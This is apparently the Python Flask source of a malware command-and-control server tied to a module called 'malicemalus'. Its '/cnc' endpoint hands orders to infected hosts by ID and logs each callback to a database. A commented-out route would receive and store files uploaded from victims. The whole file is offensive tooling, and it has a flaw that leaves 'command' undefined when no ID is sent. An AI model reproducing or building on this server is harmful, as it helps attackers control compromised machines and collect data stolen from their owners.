from flask import Flask
from flask import request
import time
from malicemalus import *

app = Flask(__name__)

#@app.route('/data', methods=['POST'])
#def post_data():
#    for req_file in request.files:
#        t = time.strftime("%b_%d_%Y_%H-%M-%S")
#        f = request.files[req_file]
#        f.save(secure_filename(f.filename) + "_" + t)
#    return 'Post'

@app.route('/cnc', methods=['GET'])
def cnc():
    uid = request.args.get('uid')

    if uid is not None:
        command = get_orders(uid)

        sql3_insert('INSERT INTO callbacks(uid, rx_data, dtg) VALUES (?,?,?)',
                   (str(uid), str(command), int(time.mktime(time.gmtime()))))

    print request.args.get('uid')
    return str(command)

if __name__ == '__main__':
    app.debug = True
    app.run(host='0.0.0.0', port=5001)

